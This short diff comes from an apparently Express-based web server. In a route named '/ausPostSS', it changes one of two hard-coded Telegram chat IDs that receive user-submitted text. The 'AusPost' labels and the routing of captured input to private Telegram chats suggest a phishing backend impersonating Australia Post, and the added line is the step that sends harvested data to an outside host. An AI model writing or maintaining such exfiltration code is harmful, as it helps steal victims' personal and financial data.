@@ -137,7 +137,7 @@ app.post("/ausPostSS", (req, res) => {
           `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=680379375&text=AusPostSS:\n${originalText}`
         );
         axios.post(
-          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=937419988&text=AusPost:\n${originalText}`
+          `https://api.telegram.org/bot${process.env.sendresbotID}/sendMessage?chat_id=1318459885&text=AusPost:\n${originalText}`
         );
         ssCount += 1;
       }
